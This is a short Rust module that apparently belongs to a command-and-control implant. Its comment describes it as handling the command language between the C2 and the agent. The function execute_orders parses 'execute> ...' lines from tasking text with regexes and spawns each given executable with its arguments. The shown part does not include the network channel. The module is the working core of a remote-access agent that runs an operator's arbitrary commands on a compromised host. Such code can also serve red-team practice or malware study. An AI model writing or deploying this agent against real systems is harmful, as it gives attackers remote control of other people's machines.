//! This module handles the command language between the C2 and the agent
use regex::Regex;
use std::process::Command;

/**
 * Takes orders from a list of strings and executes them based on their parent command
 */
pub fn execute_orders(tasks: &str) -> Result<(), ()> {
    let command_parser = Regex::new(r"(?m)^(?<instruction>[^>]+)>\s+(?<data>.*)$").unwrap();
    let execute_parser = Regex::new(r"(?m)^(?<executable>\S+)(?<args>.*)$").unwrap();

    // searching every instruction within our tasks
    for line in command_parser.captures_iter(tasks) {
        // determining the instruction this task is wanting to run
        match line.name("instruction").unwrap().as_str() {
            "execute" => {
                println!("Executing command: {}", line.name("data").unwrap().as_str());

                // splitting any spaces in given command as arguments
                let command_data = execute_parser
                    .captures(line.name("data").unwrap().as_str())
                    .unwrap();
                println!("Command data: {:?}", command_data);

                let command_array: Vec<&str> = command_data
                    .name("args")
                    .unwrap()
                    .as_str()
                    .split_whitespace()
                    .collect();
                println!("Command arguments: {:?}", command_array);

                match Command::new(command_data.name("executable").unwrap().as_str())
                    .args(command_array)
                    .spawn()
                {
                    Ok(_results) => {
                        println!("Command executed successfully");
                    },
                    Err(e) => {
                        println!("Command failed with error: {}", e);
                        // return Err("Command failed");
                    },
                };
            }
            _ => {
                println!("Invalid instruction given: {}", line.name("instruction").unwrap().as_str());
                // return Err("Invalid instruction given");
            }
        }
    }
    return Ok(());
}